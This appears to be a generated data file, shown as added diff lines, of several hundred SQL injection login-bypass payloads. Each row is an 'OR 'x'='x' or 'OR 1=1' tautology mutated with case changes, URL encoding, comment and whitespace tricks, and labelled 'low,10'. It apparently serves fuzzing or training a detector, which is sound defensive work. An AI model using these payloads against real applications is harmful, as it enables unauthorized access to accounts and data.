+'/**/OR/**/'x'='x' -- comment,low,10
+'+OR+'x'='x'+#+MySQL+comment,low,10
+""" || ""x""=""x""",low,10
+'/**/OR/**/'x'='x'/**/--/**/FHRWTPV,low,10
+' OR 'x'='x' -- SpVdcJ,low,10
+'+or+'x'='x'+#+buhqt,low,10
+' OR 'x'='x' -- zsANFGN,low,10
+' Or 'X'='x' /* test */ -- gsdTuCU,low,10
+'%20OR%20'x'='x'%20#%20mIOyODc,low,10
+'%20or%20'x'='x',low,10
+'+OR+'x'='x'+#+WURkeWqp,low,10
+' OR 'X'='X' -- UJBARHMV,low,10
+' OR 'x'='x' -- comment,low,10
+' OR 'x'='x' -- COMMENT,low,10
+'	OR	'X'='x',low,10
+' OR 'x'='x' # MySQL comment -- HysYXuCoBR,low,10
+' OR 'x'='x' # rOOSfmqyJ,low,10
+'	or	'X'='X',low,10
+"""  OR  ""x""=""x""",low,10
+' Or 'X'='x' -- cOMment,low,10
+' OR 'x'='x' -- comment # SKfcSaFMM,low,10
+' OR 'x'='x' # zJswjbL # WVPbCH,low,10
+' or 'x'='x' -- CoMMeNT /* test */,low,10
+' or 'X'='X' /* TeSt */,low,10
+'/**/OR/**/'x'='x' # MySQL comment,low,10
+' OR 'x'='x' -- zIDTqCPi -- xbrQNIAy,low,10
+' oR 'X'='x',low,10
+' Or 'X'='x',low,10
+' OR 'x'='x' -- comment -- comment -- HKClkCDzCb,low,10
+' or 'x'='X',low,10
+' OR 'x'='x' -- zOZVQ,low,10
+' OR 'x'='x' -- WTqlOEaxq,low,10
+' Or 'X'='X',low,10
+""" Or ""x""=""X""",low,10
+' OR 'x'='x' -- xJzeBS # MySQL comment,low,10
+' OR 'x'='x' -- SWUbZlf,low,10
+' Or 'x'='x',low,10
+'%20OR%20'x'='x' -- comment,low,10
+'%20OR%20'x'='x' -- ulZKoHsVc,low,10
+'%20OR%20'x'='x' # MySQL comment,low,10
+' OR 'x'='x' /* test */ # MySQL comment -- AvRPYGeJRU,low,10
+'+oR+'X'='X',low,10
+' or 'X'='X' # JJpqpXwo,low,10
+'+or+'x'='x' # MySQL comment,low,10
+' OR 'x'='x' -- WsRnvo,low,10
+' OR 'x'='x' /* test */ # MySQL comment,low,10
+' OR 'x'='X',low,10
+'/**/or/**/'x'='x',low,10
+' oR 'X'='x' # VSFNamBVkf,low,10
+'%20OR%20'x'='x' -- HrQcVWHU,low,10
+' OR 'x'='x' # SOATPynOK,low,10
+'+or+'X'='X' # JZtbnllj,low,10
+'	OR	'x'='x'	#	MySQL	comment,low,10
+""" OR ""x""=""x"" -- IfVQc",low,10
+""" || ""x""=""x"" -- comment",low,10
+' OR 'x'='x' # rjeToxVci -- comment,low,10
+'+OR+'X'='X',low,10
+' OR 'x'='x' -- comment /* test */ # lBOso,low,10
+' oR 'X'='X',low,10
+' Or 'x'='X',low,10
+' OR 'x'='x' -- UQfkyLjkeq,low,10
+'+Or+'X'='x' # mysql ComMENt,low,10
+'%20OR%20'x'='x'%20#%20MySQL%20comment,low,10
+'	or	'X'='X'	#	mYsql	COMMENT,low,10
+'/**/or/**/'x'='x' -- comment,low,10
+' or 'X'='X' # MdBnwQD,low,10
+'%20or%20'x'='X',low,10
+'  OR  'x'='x'  #  dgIEXFZVf  --  USwvy,low,10
+"""/**/||/**/""X""=""X""",low,10
+' or 'x'='x' -- ebgwX,low,10
+'+OR+'x'='x' -- comment,low,10
+'	||	'X'='X'	#	OOTUV -- NgomTocFj,low,10
+'	or	'x'='x'	#	WIpsHd,low,10
+""" OR ""X""=""X"" -- COMMENT",low,10
+""" OR ""x""=""x"" # MySQL comment",low,10
+""" OR ""x""=""X""",low,10
+""" or ""X""=""X""",low,10
+'%20OR%20'x'='x' # MfuKzIFfVV -- QbgTJVPq,low,10
+' or 'X'='X' # ZeMQJnqQ,low,10
+"""/**/OR/**/""x""=""x"" -- AnmrSni",low,10
+' || 'x'='x' # QtIHNvsHj,low,10
+' OR 'X'='x' -- UvzUwo -- CoMMENT,low,10
+'/**/OR/**/'X'='X'/**//*/**/TEST/**/*/,low,10
+'	OR	'x'='x' /* test */,low,10
+' OR 'x'='x' -- comment -- ruQRmwcZV -- comment,low,10
+'	or	'x'='x' -- idahogpp -- comment,low,10
+""" OR ""x""=""x"" # fNsVP -- PxhUN",low,10
+'%20OR%20'x'='x' /* test */,low,10
+'%20OR%20'X'='X'%20#%20MYSQL%20COMMENT -- klrAs,low,10
+'	or	'x'='x'	#	mysql	comment # MySQL comment,low,10
+'	||	'x'='x'	#	AvlntcW	--	fEChzfeCc,low,10
+'%20OR%20'x'='x'%20#%20jhcWpVVu,low,10
+' or 'x'='x' -- jbhgjwueac,low,10
+'  OR  'x'='x' # ufoCiR,low,10
+'/**/or/**/'x'='X',low,10
+'%20Or%20'X'='X',low,10
+' OR 'X'='X' /* TEST */ # MySQL comment,low,10
+'+||+'x'='x',low,10
+'+oR+'X'='x',low,10
+'/**/OR/**/'x'='x' /* test */,low,10
+' or 'X'='X' -- COMMENT -- HLoVbiWXW,low,10
+"""	||	""x""=""x""	--	comment",low,10
+' OR 'X'='X' /* test */,low,10
+' OR 'x'='x' -- ElWMDFMRp /* test */,low,10
+' oR 'x'='x' # MySqL cOMMent,low,10
+"""+OR+""x""=""x""",low,10
+' OR 'X'='X' -- COMMENT # MYSQL COMMENT,low,10
+""" OR ""x""=""x"" -- comment",low,10
+' || 'x'='x' # NHRYfcLrqq,low,10
+"""/**/OR/**/""x""=""x""/**//*/**/test/**/*/",low,10
+'	OR	'x'='x'	--	comment # MySQL comment,low,10
+'+oR+'X'='x'+#+bLyWeuZMgD,low,10
+'/**/OR/**/'x'='x'/**/#/**/ISEvg,low,10
+'+OR+'x'='x' -- oextHvho,low,10
+' OR 'X'='X' # BCQFVE,low,10
+' OR 'x'='x' -- comment -- comment,low,10
+'	OR	'X'='X',low,10
+'%20||%20'x'='x',low,10
+'+or+'X'='X'+--+iKdMfqC+#+mqPZO,low,10
+' oR 'x'='x',low,10
+'%20or%20'x'='x'%20#%20YwTKzc,low,10
+' OR 'X'='X' # XCCHPH # MYSQL COMMENT,low,10
+"""%20or%20""x""=""x""",low,10
+' OR 'x'='x' # zhnOq # DAXUUdMRka,low,10
+' OR 'x'='x' -- dBPRuwnxrh,low,10
+' || 'X'='X' # MYSQL COMMENT,low,10
+' or 'X'='X' # MySQL comment,low,10
+'+OR+'x'='x' -- eXSjsUOIcp,low,10
+' OR 'x'='x' # onwGaH -- comment,low,10
+""" or ""X""=""X"" # MySQL comment",low,10
+'%20oR%20'X'='X',low,10
+"""	OR	""x""=""x"" -- HqgsVlNGs /* test */",low,10
+'+OR+'x'='X',low,10
+' or 'x'='x' -- hmbhsqjv,low,10
+'%20||%20'x'='x' -- comment,low,10
+""" OR ""x""=""x"" -- comment -- comment /* test */",low,10
+'+OR+'x'='x'+#+MySQL+comment+#+IwxyidGWrT /* test */,low,10
+"""	OR	""x""=""x""	#	rWULmTy",low,10
+"""/**/oR/**/""x""=""x""",low,10
+'  OR  'X'='X'  #  MYSQL  COMMENT,low,10
+'	OR	'x'='x'%20/*%20test%20*/,low,10
+"""%20OR%20""x""=""x""%20--%20cyBfbuqGV",low,10
+' || 'X'='X',low,10
+' OR 'X'='X' # mYsql COMMENT,low,10
+"""/**/OR/**/""x""=""x""",low,10
+'+Or+'X'='X',low,10
+'/**/Or/**/'x'='X',low,10
+'+OR+'x'='x'+--+SXKApM,low,10
+' or 'X'='X' -- comment,low,10
+' OR 'x'='x' -- LyxzPvR,low,10
+""" OR ""x""=""x"" /* test */",low,10
+' OR 'X'='X' # MySQL comment,low,10
+'+or+'x'='x' -- DUHcNyGvbM,low,10
+'/**/OR/**/'x'='x'/**/--/**/comment # MySQL comment,low,10
+'/**/Or/**/'x'='X'/**//*/**/teST/**/*/,low,10
+"""+OR+""x""=""x"" -- SFINAcna -- comment",low,10
+'/**/||/**/'x'='x' -- fcktAZlhor,low,10
+'%20OR%20'x'='x' # ttktdv,low,10
+'+oR+'X'='X' -- comMeNT,low,10
+'%20OR%20'X'='X'%20--%20UNWNBOGTYQ,low,10
+' or 'X'='X' -- hNIWCMarLc # MYsqL coMmenT,low,10
+'+OR+'x'='x'+/*+test+*/+#+jWZeWzrm,low,10
+"""	or	""x""=""x""",low,10
+'/**/OR/**/'X'='X'/**/--/**/COMMENT,low,10
+' || 'X'='X' -- NXGYeOuB -- iEAPGOh,low,10
+'/**/OR/**/'x'='x'/**/#/**/CSXvyCgSD,low,10
+"""%20or%20""X""=""X""",low,10
+'	OR	'x'='x' -- zgBdAN,low,10
+"""	OR	""X""=""X""	#	MYSQL	COMMENT",low,10
+' OR 'X'='X' # JCHhpcQDzq,low,10
+'+OR+'x'='x'	#	BMsBXimUcE -- PPRTL,low,10
+' or 'X'='X' -- COMMENT,low,10
+""" or ""X""=""X"" -- lICPBP",low,10
+' OR 'x'='x' -- EDXcCGkr -- comment -- comment,low,10
+"""+OR+""x""=""x"" -- comment",low,10
+"""/**/OR/**/""X""=""X""",low,10
+'	OR	'x'='x'	#	ZFFVBD,low,10
+' or 'x'='x' # mysql comment,low,10
+'/**/OR/**/'x'='x' # HwTRT,low,10
+' || 'x'='x' # SkrhmA /* test */ /* test */,low,10
+' || 'X'='X' -- JOvNVo,low,10
+'/**/OR/**/'x'='x'/**/#/**/GbGoLsNlJZ,low,10
+'%20or%20'X'='X',low,10
+' OR 'x'='x' # VDODEZadFi /* test */,low,10
+"""	OR	""x""=""x""",low,10
+' OR 'X'='X' -- COMMENT,low,10
+' oR 'x'='X',low,10
+"""%20OR%20""X""=""X""",low,10
+' or 'X'='X' -- TtQPDXoUKL,low,10
+'+OR+'x'='x'+--+comment,low,10
+'+or+'X'='X' # mYsql COMMENT,low,10
+'/**/or/**/'X'='X' # mYsql COMMENT,low,10
+'/**/OR/**/'x'='x'/**/#/**/MySQL/**/comment,low,10
+' || 'x'='X',low,10
+'	Or	'x'='x'	#	gXPRpAXWPz	#	mysqL	CoMment # JSzQlDWIya,low,10
+'+or+'X'='X'+--+eUARMWHkEH+#+nyutV,low,10
+'%20OR%20'x'='x'%20--%20comment,low,10
+""" OR 1=1 #",low,10
+""" or 1=1 # # mysql comment",low,10
+""" or 1=1 #",low,10
+"""/**/or/**/1=1/**/#",low,10
+"""%20OR%201=1%20#",low,10
+""" || 1=1 #",low,10
+""" OR 1=1 # # YvxOcP",low,10
+""" OR 1=1 # -- TFGFyvEODQ",low,10
+""" OR 1=1 # # ebuOOfAV /* test */",low,10
+"""/**/||/**/1=1/**/#",low,10
+""" OR 1=1 # -- zDLhhaoc -- comment",low,10
+""" or 1=1 # -- comment",low,10
+""" OR 1=1 # -- comment",low,10
+"""/**/OR/**/1=1/**/#",low,10
+"""+or+1=1+#",low,10
+""" or 1=1 # # MySQL comment",low,10
+""" OR 1=1 # /* test */",low,10
+"""/**/OR/**/1=1/**/#/**//*/**/test/**/*//**/--/**/comment",low,10
+""" OR 1=1 # # MySQL comment",low,10
+""" oR 1=1 #",low,10
+""" OR 1=1 # # OKXourvEv /* test */",low,10
+""" OR 1=1 # -- KWxqxz",low,10
+"""  OR  1=1  #",low,10
+"""	or	1=1	#	--	comment",low,10
+""" OR 1=1 # # gVKpPZBAS",low,10
+""" OR 1=1 # -- JWtCdc",low,10
+"""	OR	1=1	#",low,10
+"""	OR	1=1	# -- comment",low,10
+""" or 1=1 # /* TEST */",low,10
+"""+OR+1=1+# -- FvKwOqSTE",low,10
+""" OR 1=1 # -- ngJTufa",low,10
+""" OR 1=1 # -- AUsYsdsmh /* test */",low,10
+""" oR 1=1 # # jGAKOyGdN",low,10
+"""	or	1=1	#",low,10
+""" or 1=1 # -- COMMENT",low,10
+""" OR 1=1 # -- ghJSCHNG # yFTtpO",low,10
+"""  or  1=1  # # mYsql COMMENT",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/vIUeSlFZ",low,10
+""" OR 1=1 # # xPydFlEb",low,10
+""" || 1=1 # -- IAYICPQ",low,10
+"""/**/OR/**/1=1/**/# # nXlEA",low,10
+""" OR 1=1 # # UmiqTDZv",low,10
+""" Or 1=1 #",low,10
+"""/**/or/**/1=1/**/#/**/#/**/mysql/**/comment",low,10
+"""/**/OR/**/1=1/**/# -- TOqQsatAr",low,10
+""" or 1=1 # -- fhfke",low,10
+"""+OR+1=1+#",low,10
+""" || 1=1 # # uxNjKwUyD",low,10
+"""+OR+1=1+#+#+MySQL+comment",low,10
+""" OR 1=1 # -- UwLDSGLO",low,10
+"""%20or%201=1%20#",low,10
+"""+OR+1=1+#+#+ivEcmU",low,10
+""" or 1=1 # -- NnLjaXnrqM",low,10
+"""/**/OR/**/1=1/**/# -- TiJkKpkNct",low,10
+""" OR 1=1 # -- xSZLp",low,10
+""" OR 1=1 # -- cMjkhA",low,10
+""" OR 1=1 # # xfXvVeLLD # NSMwvdp",low,10
+""" or 1=1 # -- cOMMent",low,10
+""" OR 1=1 # # UDAES",low,10
+"""%20OR%201=1%20#%20--%20comment%20/*%20test%20*/",low,10
+"""	||	1=1	#	--	llHfBdsgEa",low,10
+"""/**/OR/**/1=1/**/# -- comment",low,10
+""" OR 1=1 # -- KUVaU -- vHBsayZIIX",low,10
+"""	||	1=1	# # Rmssbjyu",low,10
+""" OR 1=1 # # suqhsdlbiO",low,10
+"""	OR	1=1	#	--	comment",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/MySQL/**/comment",low,10
+""" or 1=1 # # SIvmjAS",low,10
+""" OR 1=1 # -- comment # NAOLpSqrv",low,10
+"""%20OR%201=1%20# # SxnORYEPK",low,10
+"""	||	1=1	#",low,10
+""" OR 1=1 # # ZcUGhqa",low,10
+""" Or 1=1 # # wEEpX",low,10
+"""%20OR%201=1%20#%20#%20tvjVWcageC",low,10
+""" OR 1=1 # # bSZfhzHCuq",low,10
+"""+OR+1=1+# -- comment",low,10
+""" OR 1=1 # -- dmVgWo",low,10
+"""+OR+1=1+#+--+LnykrVoU",low,10
+"""+OR+1=1+#+--+ZtvWycPZz",low,10
+""" OR 1=1 # # MySQL comment /* test */",low,10
+""" OR 1=1 # /* test */ -- DPzjPbOgjY",low,10
+""" OR 1=1 # -- KQlqwd",low,10
+"""+oR+1=1+#+#+AgPUEna",low,10
+""" or 1=1 # /* test */",low,10
+""" OR 1=1 # # LFtjs",low,10
+"""/**/Or/**/1=1/**/#",low,10
+""" OR 1=1 # -- NBNHghQE",low,10
+"""%20or%201=1%20#%20/*%20TEST%20*/",low,10
+"""+OR+1=1+#+#+oeBGo",low,10
+"""	OR	1=1	# /* test */ -- hVihndUUcU",low,10
+""" OR 1=1 # /* test */ -- comment /* test */",low,10
+""" OR 1=1 # /* test */ # MySQL comment",low,10
+"""+OR+1=1+#+--+uJpUilfPZ+--+GUpxIi+--+DgiGChyAzS",low,10
+""" or 1=1 # # IQujMyxR",low,10
+"""+OR+1=1+#+--+comment",low,10
+"""%20||%201=1%20#",low,10
+"""+||+1=1+#",low,10
+""" or 1=1 # # mYsql COMMENT /* test */",low,10
+""" OR 1=1 # # HJOwQNxvbE /* test */",low,10
+""" oR 1=1 # # svSigJ -- FiEEo /* teSt */",low,10
+"""+oR+1=1+#",low,10
+"""	||	1=1	#/**/#/**/MySQL/**/comment",low,10
+"""	OR	1=1	#	#	gYUlUtESR",low,10
+""" OR 1=1 # # MySQL comment # JJhcvz",low,10
+"""+OR+1=1+#+--+KLhrFcxd",low,10
+"""+OR+1=1+#%20#%20PRyuc",low,10
+"""	||	1=1	# /* test */",low,10
+"""%20OR%201=1%20#%20--%20fnlhIlj",low,10
+"""/**/OR/**/1=1/**/#/**/--/**/comment/**/--/**/MUdGfxc",low,10
+""" or 1=1 # -- zfvpoliael",low,10
+""" OR 1=1 # -- COMMENT -- comment",low,10
+"""%20OR%201=1%20#/**/--/**/CQzvqqSrH # MySQL comment",low,10
+""" OR 1=1 # -- FaUNIquD -- tsIbFQ /* test */",low,10
+"""%20||%201=1%20# -- XjrLVBDiE",low,10
+""" or 1=1 # # PpAbMH -- COMMENT",low,10
+""" OR 1=1 # -- ORawjIbMIA -- EzACwQG",low,10
+""" || 1=1 # -- elsgmpeeb # MySQL comment",low,10
+""" or 1=1 # # rhapcfktj",low,10
+""" OR 1=1 # -- eFhcC /* test */",low,10
+"""%20OR%201=1%20#%20#%20MySQL%20comment",low,10
+""" OR 1=1 # # ATKRm",low,10
+"""	OR	1=1	#	--	AmvYBxD",low,10
+"""+OR+1=1+# # lDtucG",low,10
+"""	||	1=1	#	#	VXgPPBF",low,10
+"""	OR	1=1	#	/*	test	*/ -- imJfKpNly",low,10
+""" OR 1=1 # -- lYinRI -- comment # MySQL comment",low,10
+""" || 1=1 # /* TEsT */ # FdiTdmxRJK",low,10
+"""	oR	1=1	#",low,10
+"""	or	1=1	# -- comment",low,10
+""" OR 1=1 # # yakVfC -- bVvnMo /* test */",low,10
+""" oR 1=1 # -- SexXGMEq /* test */",low,10
+"""/**/OR/**/1=1/**/# -- bnBUnDkiIE",low,10
+""" OR 1=1 # -- DJIUKZMCRJ",low,10
+""" OR 1=1 # -- hAIXFGaALY",low,10
+""" oR 1=1 # -- RUjkD",low,10
+"""%20or%201=1%20# /* test */",low,10
+"""/**/||/**/1=1/**/# -- azhKgU",low,10
+""" OR 1=1 # # rqrHPWm # WfRvdrnMoR",low,10
+""" OR 1=1 # -- tBLadWsRWQ # MySQL comment",low,10
+"""%20OR%201=1%20#/**//*/**/test/**/*/",low,10
+"""  OR  1=1  # # MySQL comment",low,10
+""" Or 1=1 # # VRtFFRqkj # mYSQL coMmENT /* TEst */",low,10
+""" OR 1=1 # -- cKmgKRuk",low,10
+"""	OR	1=1	# # EAIMW",low,10
+""" || 1=1 # -- comment",low,10
+"""+OR+1=1+#+/*+test+*/",low,10
+""" or 1=1 # # mYsql COMMENT",low,10
+""" oR 1=1 # -- ezcEzSXk -- comment",low,10
+""" OR 1=1 # -- comment -- comment",low,10
+"""/**/OR/**/1=1/**/#/**//*/**/test/**/*/ -- lzSnupyWJ",low,10
+"""/**/||/**/1=1/**/#/**/#/**/jeEed",low,10
+""" Or 1=1 # # MySQL comment",low,10
+""" || 1=1 # /* test */",low,10
+""" or 1=1 # -- iKHgJM",low,10
+""" OR 1=1 # # xIxtBhGq -- xvPLEMpP",low,10
+""" Or 1=1 # /* TEST */",low,10
+"""/**/OR/**/1=1/**/#/**/--/**/cUNwz",low,10
+""" or 1=1 # # wwMKOBEGy",low,10
+"""	OR	1=1	#	#	ymFkwe",low,10
+""" or 1=1 # # ReturHM",low,10
+"""%20OR%201=1%20#%20--%20dJAWxTC",low,10
+"""+or+1=1+# /* TEST */",low,10
+""" OR 1=1 # -- yinZYhYKNF",low,10
+"""	OR	1=1	#	--	BENQWJQBQ",low,10
+"""%20or%201=1%20#%20#%20ekjafofpkn",low,10
+"""%20OR%201=1%20#%20#%20MySQL%20comment%20#%20YllZIhLQA%20--%20HTKil",low,10
+"""+Or+1=1+# # ztqtkn # MySQL comment",low,10
+"""+||+1=1+# /* test */",low,10
+"""	or	1=1	#+#+NHBvW",low,10
+""" oR 1=1 # /* test */ # HwgwIGHGOH",low,10
+""" OR 1=1 # # qudOAYpvqo # MySQL comment",low,10
+"""	OR	1=1	# # MySQL comment",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/MYSQL/**/COMMENT",low,10
+"""%20or%201=1%20#%20--%20comment",low,10
+""" OR 1=1 # -- AYBGSF",low,10
+"""	OR	1=1	#	--	nhTdQfxTg	#	MySQL	comment",low,10
+""" OR 1=1 # # NvKTr",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/MySQL/**/comment/**/#/**/bCkclnQVJ",low,10
+""" OR 1=1 # -- iikGiDQile",low,10
+"""%20OR%201=1%20#%20#%20ilQXw",low,10
+""" or 1=1 # # xijbfqud /* test */",low,10
+"""/**/OR/**/1=1/**/#	#	BuTdV # MySQL comment",low,10
+""" or 1=1 # -- xoLmaXriM -- IuGaN",low,10
+"""	OR	1=1	# # UIFZVukEM",low,10
+"""/**/OR/**/1=1/**/#/**/--/**/oqWAiWLBW/**/#/**/epoMZPFKM # MySQL comment",low,10
+""" OR 1=1 # -- hAmyf /* test */",low,10
+"""	OR	1=1	# # dhWvi",low,10
+"""/**/OR/**/1=1/**/# -- comment # duGLf",low,10
+"""%20OR%201=1%20#%20/*%20TEST%20*/",low,10
+"""+or+1=1+#+--+XQUhMyJbAd",low,10
+"""/**/or/**/1=1/**/#/**/#/**/UMLXYEY",low,10
+"""	Or	1=1	#",low,10
+"""+||+1=1+# # MySQL comment",low,10
+"""+OR+1=1+# /* TEST */",low,10
+"""+||+1=1+# -- GwZYMZ",low,10
+""" or 1=1 # # MysqL coMMENt # UTnDkXAsF",low,10
+"""	OR	1=1	#	#	MySQL	comment	/*	test	*/",low,10
+"""/**/or/**/1=1/**/# # MySQL comment",low,10
+""" OR 1=1 # # yrtohxC -- CPiVGW",low,10
+"""	OR	1=1	#	--	DdJdK",low,10
+""" OR 1=1 # -- comment /* test */",low,10
+""" OR 1=1 # # MySQL comment -- comment",low,10
+"""/**/or/**/1=1/**/#/**/--/**/COMMENT",low,10
+""" OR 1=1 # # REJSkx",low,10
+""" OR 1=1 # -- DoFSJG -- comment # MySQL comment",low,10
+""" OR 1=1 # -- comment -- fPnaGIrV",low,10
+"""	OR	1=1	#	--	lKTJdq",low,10
+""" OR 1=1 # # MFwzxrQ",low,10
+""" or 1=1 # # WqOXIs # mYsql COMMENT",low,10
+""" Or 1=1 # -- comment # YPSPEV # IpWDvOAg",low,10
+""" OR 1=1 # -- zPCCbvykyK # MYSql COmmeNt",low,10
+"""/**/or/**/1=1/**/# # itjyjzgwsh /* test */",low,10
+"""	OR	1=1	# /* test */",low,10
+""" OR 1=1 # -- LhsXGitOF # MySQL comment # MySQL comment",low,10
+"""+OR+1=1+# /* test */ # GLyMDMpZh",low,10
+"""%20or%201=1%20#%20#%20mysql%20comment%20--%20comment",low,10
+""" || 1=1 # # MySQL comment",low,10
+"""	||	1=1	#/**/--/**/TZEEOW",low,10
+"""	||	1=1	#	#	MySQL	comment",low,10
+""" or 1=1 # /* TEST */ # MDjLM",low,10
+"""/**/OR/**/1=1/**/# -- comment -- bgGpkE",low,10
+""" OR 1=1 # -- IrGfanelmJ",low,10
+""" oR 1=1 # -- CoMmEnt",low,10
+""" || 1=1 # -- YlgwyoBkYu",low,10
+""" Or 1=1 # # AKfEYNjFrC",low,10
+"""%20Or%201=1%20# -- NuFCwyWr",low,10
+""" OR 1=1 # -- nTJbXre /* test */",low,10
+"""+OR+1=1+#+--+COMMENT",low,10
+""" or 1=1 # # uPqAJPmKb",low,10
+"""%20or%201=1%20#  #  mYsql  COMMENT",low,10
+""" or 1=1 # # comment -- dqqponxdd",low,10
+"""+OR+1=1+#+--+comment # CiYvLgTil",low,10
+"""%20or%201=1%20# -- DbhbBfg",low,10
+"""	OR	1=1	#	/*	TEST	*/",low,10
+""" OR 1=1 # # BZhfpYP # lQVKPVO",low,10
+""" or 1=1 # -- xefVlXnB",low,10
+"""/**/OR/**/1=1/**/# -- comment -- QUfmBereQ",low,10
+""" OR 1=1 # # kmpjVtPBa",low,10
+""" OR 1=1 # # ujKPmFrAmG",low,10
+"""+or+1=1+# # mYsql COMMENT # MySQL comment",low,10
+"""  OR  1=1  # -- comment",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/MNAmRnNj",low,10
+"""%20OR%201=1%20#%20--%20GMDlAbR",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/ojRmhoN",low,10
+"""/**/OR/**/1=1/**/#/**/#/**/mYsql/**/COMMENT",low,10
+""" || 1=1 # /* test */ /* test */",low,10
+"""	Or	1=1	#	#	QhrKqkCpb",low,10
+""" || 1=1 # -- ynQTw /* test */",low,10
+"""/**/OR/**/1=1/**/# /* test */ -- comment",low,10
+""" OR 1=1 # -- iKDUTpqD",low,10
+or 1=1--,low,10
+or 1=1-- # vnAQTTwRDt # MySQL comment,low,10
+or%201=1--,low,10
+Or 1=1--,low,10
+or 1=1-- # MySQL comment,low,10
+or+1=1--,low,10
+or 1=1-- # chfcbWe,low,10
+or 1=1-- -- comment,low,10
+OR 1=1--,low,10
+OR 1=1-- /* test */,low,10
+or 1=1-- # QAgDNol,low,10
+or/**//**/1=1--,low,10
+or 1=1-- /* test */,low,10
+or%201=1--%20--%20comment,low,10
+or/**/1=1#,low,10
+or 1=1-- -- qsndtibym,low,10
+or	1=1--,low,10
+oR 1=1--,low,10
+or 1=1#,low,10
+or	1=1--	--	bQnOEccyU,low,10
+or 1=1-- # VAyVhcsG,low,10
+or+1=1--+#+ZgiUXD,low,10
+or	1=1--	/*	test	*/,low,10
+OR 1=1-- # jSgrz,low,10
+or	1=1--	#	MySQL	comment # MySQL comment,low,10
+or%201=1-- -- QqptZKAU,low,10
+OR+1=1--+--+COMMENT,low,10
+oR	1=1--,low,10
+OR+1=1-- -- tyuyoGRNZa,low,10
+oR%201=1--,low,10
+or/**/1=1--,low,10
+or 1=1-- # IfPlzdSIh,low,10
+oR 1=1-- /* tEsT */,low,10
+or+1=1--+#+MySQL+comment,low,10
+||%201=1--,low,10
+OR%201=1--,low,10
+or	1=1-- # mysql comment,low,10
+or+1=1--+--+ekQZsiZWB,low,10
+OR 1=1-- -- VOiJNtHOH,low,10
+or  1=1--  /*  test  */,low,10
+or 1=1# # mBCRA,low,10
+or 1=1-- -- OYATl,low,10
+OR 1=1-- # mYsql COMMENT,low,10
+or 1=1-- -- PLKTTX,low,10
+oR 1=1-- -- comment,low,10
+OR 1=1-- /* TEST */ /* test */,low,10
+or 1=1-- -- TDZhAp,low,10
+or 1=1-- # mysqL cOMMeNt -- PmKsgy,low,10
+OR/**/1=1-- /* TEST */,low,10
+OR	1=1-- /* test */,low,10
+OR	1=1--,low,10
+Or 1=1# # MySQL comment,low,10
+or 1=1-- -- MkpFkVVWLn,low,10
+or%201=1-- # JZFUKUSES,low,10
+or/**/1=1--/**/#/**/feaLaOse/**/#/**/MySQL/**/comment,low,10
+OR 1=1-- # QORWRHmI,low,10
+or 1=1-- -- SZOEY,low,10
+or 1=1-- -- RqQqnDW,low,10
+or+1=1-- -- comment,low,10
+OR 1=1-- /* test */ -- JcudGU,low,10
+or 1=1-- -- XQyxf,low,10
+or 1=1-- # OjjPuRQOpF -- IddgCvf,low,10
+or+1=1#,low,10
+or/**/1=1--	#	MySQL	comment,low,10
+or+1=1--+--+mFYsnXIcUp,low,10
+or	1=1--	--	XrJNuB,low,10
+or 1=1-- -- GHaZPrmXIw,low,10
+OR 1=1-- # AIDIJIHCGM,low,10
+or	1=1-- # MySQL comment,low,10
+or 1=1-- -- AGwifuBbpo # bhpPCitr,low,10
+Or 1=1-- -- cOMmeNT,low,10
+or	1=1-- -- comment,low,10
+or 1=1-- # DUZqWPs,low,10
+OR 1=1-- -- znndfzzKTd,low,10
+or 1=1-- # uboIbnBa /* test */,low,10
+or 1=1# # MySQL comment,low,10
+OR 1=1-- -- XCDVMMVBTP,low,10
+or 1=1-- # yirqfdqqx,low,10
+or%201=1--%20#%20MySQL%20comment%20--%20XKwbi,low,10
+oR	1=1-- -- comment,low,10
+or 1=1-- -- vhlioB,low,10
+oR/**/1=1-- /* test */,low,10
+or 1=1-- -- kOzbpAr,low,10
+or%201=1-- # edkfoiyhmg,low,10
+or%201=1-- /* test */,low,10
+OR 1=1#,low,10
+or 1=1-- # CpVGqb,low,10
+or%201=1# # mmmPPyCN # MySQL comment,low,10
+or+1=1--+--+iaoixwmo,low,10
+or	1=1#,low,10
+oR+1=1-- # MySQL comment,low,10
+or/**/1=1--/**/--/**/GfrMMHc,low,10
+or/**/1=1#/**/#/**/comment # zXVkOFZC,low,10
+or 1=1# -- comment,low,10
+OR/**/1=1--/**//*/**/TEST/**/*/ # SECgDYc,low,10
+or	1=1--	--	comment,low,10
+or 1=1-- # SLVyYrj,low,10
+or%201=1--%20--%20comment%20/*%20test%20*/,low,10
+or/**/1=1-- /* test */,low,10
+or	1=1--	#	RsSYwFjU,low,10
+OR 1=1-- -- COMMENT /* test */,low,10
+OR%201=1#%20#%20mySQL%20CoMmeNT,low,10
+or%201=1--%20#%20jdrpivz,low,10
+OR 1=1-- # sPhSvJr,low,10
+or+1=1--+#+RviabhEuRK,low,10
+OR/**/1=1--,low,10
+OR+1=1-- # uaQKjKHyt,low,10
+OR/**/1=1-- /* test */,low,10
+OR	1=1--/**//*/**/TEST/**/*/,low,10
+OR  1=1--  --  COMMENT,low,10
+or 1=1# # CSmeQALyNz,low,10
+or 1=1-- -- TfODuiPk # gqGkJgzbhw,low,10
+or 1=1# # zSfkf,low,10
+OR 1=1-- -- COMMENT,low,10
+Or 1=1-- # MySQL comment,low,10
+or 1=1# -- dQWWdXjqL,low,10
+or 1=1-- -- MJAtifCxto,low,10
+or 1=1# # RKhoth,low,10
+or 1=1-- /* test */ # MySQL comment # qmFcATnIKQ,low,10
+OR 1=1-- -- comment # MySQL comment,low,10
+or%201=1#,low,10
+||%201=1-- # MYSQL COMMENT,low,10
+OR	1=1--	#	PPJTPKbCT,low,10
+or/**/1=1--/**/#/**/mysql/**/comment # PGbJMLXrpP /* test */,low,10
+or	1=1#	#	MySQL	comment -- Bosjv,low,10
+or	1=1--	#	woRIvwqbHJ,low,10
+or+1=1--+/*+test+*/+--+kJoFNcb,low,10
+or 1=1-- -- comment -- comment,low,10
+or%201=1-- # MySQL comment,low,10
+or+1=1--+#+TbFtZP,low,10
+or	1=1# # comment,low,10
+|| 1=1-- # MySQL comment,low,10
+OR 1=1-- -- COMMENT # beiOISUn,low,10
+OR 1=1-- # FCUHMGGC -- tIzliS,low,10
+or  1=1-- /* test */,low,10
